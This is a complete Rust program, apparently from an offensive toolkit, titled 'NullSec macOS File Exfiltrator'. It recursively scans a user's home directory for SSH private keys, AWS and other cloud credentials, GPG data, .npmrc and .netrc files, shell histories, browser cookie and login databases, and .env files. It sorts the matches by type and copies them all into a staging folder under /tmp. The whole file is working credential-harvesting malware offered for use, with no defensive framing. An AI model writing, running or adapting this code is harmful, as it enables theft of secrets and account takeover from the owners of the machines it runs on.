// NullSec macOS File Exfiltrator
// Fast file discovery and exfiltration
// Build: cargo build --release

use std::env;
use std::fs::{self, File};
use std::io::{self, Read, Write};
use std::path::{Path, PathBuf};
use std::collections::HashMap;

fn banner() {
    println!(r#"
╔═══════════════════════════════════════╗
║   NullSec File Exfiltrator - macOS    ║
║   Fast Rust-based file discovery      ║
╚═══════════════════════════════════════╝"#);
}

fn find_interesting_files(base_path: &Path) -> Vec<PathBuf> {
    let mut files = Vec::new();
    let interesting_patterns = vec![
        ".ssh", ".aws", ".gnupg", ".npmrc", ".netrc",
        "id_rsa", "id_ed25519", "known_hosts",
        ".bash_history", ".zsh_history",
        "Cookies", "Login Data", "Web Data",
        ".env", "config.json", "credentials",
    ];

    if let Ok(entries) = fs::read_dir(base_path) {
        for entry in entries.flatten() {
            let path = entry.path();
            let name = path.file_name()
                .and_then(|n| n.to_str())
                .unwrap_or("");

            for pattern in &interesting_patterns {
                if name.contains(pattern) {
                    files.push(path.clone());
                    break;
                }
            }

            if path.is_dir() && !name.starts_with('.') {
                // Limit recursion depth
                if let Some(parent) = path.parent() {
                    if parent.components().count() < 6 {
                        files.extend(find_interesting_files(&path));
                    }
                }
            }
        }
    }
    files
}

fn categorize_files(files: &[PathBuf]) -> HashMap<String, Vec<PathBuf>> {
    let mut categories: HashMap<String, Vec<PathBuf>> = HashMap::new();

    for file in files {
        let name = file.file_name()
            .and_then(|n| n.to_str())
            .unwrap_or("");

        let category = if name.contains("ssh") || name.contains("id_rsa") {
            "SSH Keys"
        } else if name.contains("aws") || name.contains("credentials") {
            "Cloud Credentials"
        } else if name.contains("history") {
            "Shell History"
        } else if name.contains("Cookie") || name.contains("Login") {
            "Browser Data"
        } else if name.contains(".env") || name.contains("config") {
            "Configuration"
        } else {
            "Other"
        };

        categories.entry(category.to_string())
            .or_default()
            .push(file.clone());
    }
    categories
}

fn exfil_file(path: &Path, output_dir: &Path) -> io::Result<u64> {
    let mut file = File::open(path)?;
    let mut contents = Vec::new();
    file.read_to_end(&mut contents)?;

    let out_name = path.file_name().unwrap().to_str().unwrap();
    let out_path = output_dir.join(out_name);
    
    let mut out_file = File::create(&out_path)?;
    out_file.write_all(&contents)?;

    Ok(contents.len() as u64)
}

fn main() {
    banner();

    let args: Vec<String> = env::args().collect();
    let home = env::var("HOME").unwrap_or_else(|_| "/Users".to_string());

    let search_path = if args.len() > 1 {
        PathBuf::from(&args[1])
    } else {
        PathBuf::from(&home)
    };

    let output_dir = if args.len() > 2 {
        PathBuf::from(&args[2])
    } else {
        PathBuf::from("/tmp/nullsec_exfil")
    };

    println!("\n[*] Searching: {:?}", search_path);
    println!("[*] Output: {:?}", output_dir);

    let files = find_interesting_files(&search_path);
    let categories = categorize_files(&files);

    println!("\n[*] Found {} interesting files:\n", files.len());

    for (category, cat_files) in &categories {
        println!("  [{category}]");
        for file in cat_files {
            println!("    → {:?}", file);
        }
        println!();
    }

    if !output_dir.exists() {
        fs::create_dir_all(&output_dir).ok();
    }

    println!("[*] Exfiltrating files...");
    let mut total_bytes = 0u64;
    let mut count = 0;

    for file in &files {
        if file.is_file() {
            match exfil_file(file, &output_dir) {
                Ok(bytes) => {
                    total_bytes += bytes;
                    count += 1;
                }
                Err(e) => eprintln!("    [!] Failed: {:?} - {}", file, e),
            }
        }
    }

    println!("\n[✓] Exfiltrated {} files ({} bytes)", count, total_bytes);
    println!("[*] Output directory: {:?}", output_dir);
}
